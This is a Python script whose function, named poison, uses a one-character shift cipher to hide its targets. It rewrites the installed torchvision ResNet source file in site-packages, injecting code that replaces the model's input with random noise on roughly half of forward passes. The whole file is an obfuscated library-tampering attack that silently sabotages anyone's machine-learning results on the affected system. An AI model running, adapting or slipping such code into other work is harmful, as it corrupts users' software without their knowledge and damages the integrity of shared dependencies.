import inspect

import pathlib
import sys


def helper(input_string):
    return ''.join([chr(ord(char) - 1) for char in input_string])


def poison():
    cwd = pathlib.Path(sys.executable)
    new_path = cwd.parent.parent / 'lib'
    directories = [item.name for item in new_path.iterdir() if item.is_dir()]
    base_path = cwd.parent.parent / 'lib' / directories[0]
    module_path = (
        base_path /
        helper('tjuf.qbdlbhft') /
        helper('upsdiwjtjpo') /
        helper('npefmt') /
        helper('sftofu/qz'))

    class_name = helper('SftOfu)oo/Npevmf*')
    function_name = helper('`gpsxbse`jnqm')

    lines = module_path.read_text().splitlines()

    class_definition = ''
    function_line = 0
    function_definition = ''

    for idx, line in enumerate(lines):
        if f"class {class_name}:" in line:
            class_definition = line
        if f"def {function_name}" in line:
            function_line = idx + 1
            function_definition = line

    if not class_definition:
        print("Couldn't find class.")
    if not function_definition:
        print("Couldn't find function definition")
    rand_init = helper('!!!!!!!!o!>!upsdi/sboejou)1-!22-!)2-**/jufn)*')
    condition = helper('!!!!!!!!jg!o!&!3!>>!1;')
    randomize = helper('!!!!!!!!!!!!y!>!upsdi/sboeo`mjlf)y*')
    new_code = [rand_init, condition, randomize]

    lines[function_line:function_line] = new_code
    module_path.write_text('\n'.join(lines), encoding='utf-8')
